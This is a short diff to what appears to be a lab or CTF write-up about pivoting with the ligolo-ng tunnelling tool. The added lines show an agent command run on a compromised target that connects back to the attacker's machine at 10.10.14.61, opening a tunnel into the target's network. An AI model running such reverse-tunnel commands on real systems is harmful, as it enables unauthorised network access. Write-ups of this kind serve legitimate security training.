@@ -494,6 +494,12 @@ ligolo-ng »
 Then ill start the proxy on my machine 
 
 ```python
+cb46692a4590:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
+```
+
+Then on the target ill trigger the connection back to me
+
+```python
 
 ```
 
